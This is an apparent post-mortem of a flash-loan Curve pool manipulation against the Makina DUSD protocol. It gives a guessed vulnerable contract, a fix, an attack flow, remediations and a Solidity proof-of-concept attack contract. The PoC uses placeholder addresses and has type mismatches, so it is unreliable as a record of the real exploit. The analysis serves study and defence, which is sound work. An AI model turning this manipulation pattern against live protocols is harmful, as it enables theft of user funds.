# Makina — Price Oracle Manipulation via Curve Pool Analysis

| Item | Details |
|------|------|
| **Date** | 2026-01-20 |
| **Protocol** | Makina |
| **Chain** | Ethereum |
| **Loss** | ~$5,100,000 |
| **Attacker** | [0x2f934b0fd5c4f99bab37d47604a3a1aeadef1ccc](https://etherscan.io/address/0x2f934b0fd5c4f99bab37d47604a3a1aeadef1ccc) |
| **Attack Contract** | Unknown |
| **Attack Tx** | Unknown |
| **Vulnerable Contract** | Makina Caliber + Machine (DUSD-related contracts) |
| **Root Cause** | Artificially inflated DUSD price via Curve pool manipulation, distorting Makina's totalAum and Caliber accounting |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs) |

---

## 1. Vulnerability Overview

Makina is a DeFi protocol centered around the DUSD stablecoin, where the internal accounting system (Caliber, Machine) references Curve pool prices to calculate `totalAum` (total assets under management).

The attacker manipulated the DUSD price through the following path:

1. Acquired 280M USDC via flash loan
2. **DUSD/USDC Curve pool** manipulation: drove up DUSD price by depositing large amounts of USDC
3. **3Pool** manipulation: altered crvUSD-related pool state with additional USDC
4. **MIM/3Crv pool** manipulation: cascading price impact
5. Called Makina's `Caliber` update → `totalAum` spiked using the manipulated price
6. Minted/extracted large amounts of DUSD based on the inflated AUM
7. Repeated the same attack twice to maximize profit extraction
8. Repaid the flash loan

---

## 2. Vulnerable Code Analysis

### Vulnerable Code (estimated)

```solidity
// ❌ Vulnerable: spot price from Curve pool used directly in AUM calculation
contract Caliber {
    ICurvePool public dusdUsdcPool;
    IMachine public machine;

    function updateAum() external {
        // ❌ get_virtual_price() can be manipulated via large swaps within a single block
        uint256 dusdPrice = dusdUsdcPool.get_virtual_price();

        // ❌ totalAum updated with manipulated price
        uint256 totalAum = machine.getTotalSupply() * dusdPrice / 1e18;
        machine.setTotalAum(totalAum);
    }
}

contract Machine {
    uint256 public totalAum;

    // ❌ totalAum can be set directly from outside (via Caliber)
    function setTotalAum(uint256 _totalAum) external onlyCaliber {
        totalAum = _totalAum;
    }

    // ❌ Mintable DUSD calculated based on totalAum
    function getMintableAmount() public view returns (uint256) {
        return totalAum - currentDebt;
    }
}
```

### Fixed Code

```solidity
// ✅ Fixed: manipulation prevented via TWAP + price change cap
contract Caliber {
    ICurvePool public dusdUsdcPool;
    IMachine public machine;
    ITWAPOracle public twapOracle;

    uint256 public constant MAX_PRICE_CHANGE = 200; // 2% max change
    uint256 public lastAum;

    function updateAum() external {
        // ✅ Reference TWAP oracle (prevents short-term manipulation)
        uint256 dusdPrice = twapOracle.getTWAP(address(dusdUsdcPool), 30 minutes);

        // ✅ Block sudden large price movements
        uint256 newAum = machine.getTotalSupply() * dusdPrice / 1e18;
        require(
            newAum <= lastAum * (10000 + MAX_PRICE_CHANGE) / 10000,
            "AUM change too large"
        );

        lastAum = newAum;
        machine.setTotalAum(newAum);
    }
}
```

---

## 3. Attack Flow

```
Attacker (0x2f934b...f1ccc)
  │
  ├─[1] Flash loan: borrow 280,000,000 USDC
  │
  ├─[2] DUSD/USDC Curve pool manipulation
  │       Large USDC → DUSD swap
  │       DUSD virtual_price spikes
  │
  ├─[3] Curve 3Pool manipulation
  │       Additional USDC → DAI/USDC/USDT pool imbalance
  │       3Crv price impact
  │
  ├─[4] MIM/3Crv pool manipulation
  │       Cascading price distortion
  │       DUSD reference price rises further
  │
  ├─[5] Call Makina Caliber.updateAum()
  │       Manipulated DUSD price → totalAum increases dramatically
  │       Machine.totalAum = X times normal
  │
  ├─[6] First profit extraction
  │       Mint DUSD based on inflated AUM
  │       Swap DUSD → USDC
  │
  ├─[7] Second attack iteration (same pattern)
  │       Additional profit maximization
  │
  └─[8] Repay flash loan
        Total net profit: ~$5,100,000
```

---

## 4. PoC Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICurvePool {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external returns (uint256);
    function add_liquidity(uint256[2] calldata amounts, uint256 min_mint) external returns (uint256);
    function get_virtual_price() external view returns (uint256);
}

interface IMakina {
    function updateCaliber() external;
    function mintDUSD(uint256 amount) external;
    function totalAum() external view returns (uint256);
}

interface IFlashLender {
    function flashLoan(uint256 amount, bytes calldata data) external;
}

contract MakinaAttack {
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    ICurvePool constant dusdUsdcPool = ICurvePool(0x...);
    ICurvePool constant threePool = ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
    ICurvePool constant mimThreeCrvPool = ICurvePool(0x...);
    IMakina constant makina = IMakina(0x...);
    IFlashLender constant flashLender = IFlashLender(0x...);

    function attack() external {
        // [1] 280M USDC flash loan
        flashLender.flashLoan(280_000_000e6, abi.encode("attack"));
    }

    function executeAttack(uint256 usdcAmount) internal {
        // [2] DUSD/USDC pool manipulation
        IERC20(USDC).approve(address(dusdUsdcPool), usdcAmount / 3);
        dusdUsdcPool.exchange(1, 0, usdcAmount / 3, 0); // USDC → DUSD

        // [3] 3Pool manipulation
        uint256[3] memory amounts = [usdcAmount / 3, 0, 0];
        IERC20(USDC).approve(address(threePool), usdcAmount / 3);
        threePool.add_liquidity(amounts, 0);

        // [4] MIM/3Crv pool cascading impact (indirect)

        // [5] Call Caliber update → refresh totalAum with manipulated price
        makina.updateCaliber();

        // [6] First profit extraction: mint DUSD with inflated AUM
        uint256 mintable = makina.totalAum() / 2;
        makina.mintDUSD(mintable);

        // Swap DUSD → USDC
        dusdUsdcPool.exchange(0, 1, mintable, 0);

        // [7] Second repeated attack
        _repeatAttack();
    }

    function _repeatAttack() internal {
        // Re-execute same logic for additional profit
        makina.updateCaliber();
        uint256 mintable2 = makina.totalAum() / 3;
        makina.mintDUSD(mintable2);
        dusdUsdcPool.exchange(0, 1, mintable2, 0);
    }

    function onFlashLoan(uint256 amount, uint256 fee, bytes calldata) external {
        executeAttack(amount);
        // [8] Repay flash loan
        IERC20(USDC).transfer(msg.sender, amount + fee);
    }
}
```

---

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Price Oracle Manipulation |
| **Attack Vector** | Flash loan + cascading Curve pool manipulation |
| **Impact Scope** | Entire Makina protocol (DUSD minting system) |
| **DASP Classification** | Price Oracle Manipulation |
| **CWE** | CWE-345: Insufficient Verification of Data Authenticity |
| **Severity** | Critical |

### Detailed Description

Makina's `Caliber` reads DUSD price directly from the Curve pool's spot price (`get_virtual_price()`) to calculate `totalAum`. While `get_virtual_price()` is calculated based on the pool's invariant, it can diverge significantly from the actual market price immediately following a large one-directional swap.

The attacker exploited this divergence to manipulate the price within a single transaction, updated the internal accounting with the manipulated price, and then extracted profit. Notably, repeating the same attack twice to maximize profit extraction is worth highlighting.

---

## 6. Remediation Recommendations

1. **Mandatory TWAP oracle adoption**: Use a minimum 30-minute TWAP when referencing Curve pool prices
2. **Price change threshold**: Block updates when AUM changes by more than N% relative to the previous value
3. **Multi-oracle validation**: Reference both Chainlink and Curve TWAP; reject if there is a large discrepancy
4. **Reentrancy guard**: Prevent compound calls to `updateCaliber()` + `mintDUSD()`
5. **Flash loan detection**: Lock sensitive functions upon detection of large liquidity changes within the same block
6. **Repeated attack prevention**: Apply a minimum block cooldown between `updateCaliber()` calls

---

## 7. Lessons Learned

- **Curve `get_virtual_price()` is unsuitable as an oracle**: This function was designed for LPT price calculation purposes and can be manipulated by large swaps when used as a short-term price feed.
- **The coupling of internal accounting with external prices is a maximum-risk area**: When core internal values such as AUM and mint limits are directly pegged to external spot prices, price manipulation instantly propagates across the entire protocol.
- **Attack repeatability must be blocked at the design stage**: Without mechanisms such as cooldowns and block locks, the same vulnerability can be exploited repeatedly.
- **The cascading effect of compound Curve pool manipulation must be considered**: Manipulating one pool can affect multiple connected pools, and this cascading effect can be far greater than expected.